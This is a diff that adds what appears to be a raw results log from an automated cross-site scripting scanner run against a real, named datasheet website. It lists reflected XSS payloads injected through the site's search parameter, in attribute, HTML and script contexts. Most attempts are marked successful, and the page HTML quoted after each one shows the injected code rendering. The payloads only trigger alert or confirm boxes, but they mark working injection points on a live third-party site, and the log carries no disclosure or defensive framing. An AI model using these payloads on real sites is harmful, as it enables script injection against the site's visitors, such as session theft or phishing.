@@ -1,0 +1,59 @@
+DirectGetParams/.datasheet4u.com
+
+https://www.datasheet4u.com/search.php?sWord=" onmouseover="alert`1`
+Context = ATTR
+Success = TRUE
+Detection:
+<meta NAME="keywords" content="" onmouseover="alert`1`, " onmouseover="alert`1` datasheet pdf, " onmouseover="alert`1` data sheet, Datasheet4U.com">
+<meta NAME="description" content="" onmouseover="alert`1`, " onmouseover="alert`1` datasheet pdf, " onmouseover="alert`1` data sheet, Datasheet4U.com">
+<link rel="canonical" href="/share_search.php?sWord=" onmouseover="alert`1`">
+<input type="text" name="sWord" size="30" value="" onmouseover="alert`1`" style="width:300px;height:45px; border:solid 3px #1887DB; font-size:20">
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord=<img src=x onerror='alert`1`'>
+Context = HTML
+Success = TRUE
+Detection:
+<img src=x onerror='alert`1`'> circuit, <img src=x onerror='alert`1`'> datenblatt, block diagram, schematic, Datasheet4U.com</title>
+<font color="red"><img src=x onerror='alert`1`'></font>
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord=<img src=x onerror="alert`1`">
+Context = HTML
+Success = TRUE
+Detection:
+<img src=x onerror="alert`1`"> circuit, <img src=x onerror="alert`1`"> datenblatt, block diagram, schematic, Datasheet4U.com</title>
+<font color="red"><img src=x onerror="alert`1`"></font>
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord=<img src=x onerror='alert`1`'>
+Context = HTML
+Success = TRUE
+Detection:
+<img src=x onerror='alert`1`'> circuit, <img src=x onerror='alert`1`'> datenblatt, block diagram, schematic, Datasheet4U.com</title>
+<font color="red"><img src=x onerror='alert`1`'></font>
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord=<img src=x onerror="alert`1`">
+Context = HTML
+Success = TRUE
+Detection:
+<img src=x onerror="alert`1`"> circuit, <img src=x onerror="alert`1`"> datenblatt, block diagram, schematic, Datasheet4U.com</title>
+<font color="red"><img src=x onerror="alert`1`"></font>
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord='; confirm`1`; '
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script type="text/javascript">
+ dataLayer = [{ 'post_page':'Search','post_pn':''; confirm`1`; '','post_id':'Search'}]; 
+</script>
+
+-----------------------------------------------------------------------------------------------------
+https://www.datasheet4u.com/search.php?sWord=</script><script>alert`1`</script>
+Context = SCRIPT
+Success = FALSE
+Detection:
+None
+-----------------------------------------------------------------------------------------------------
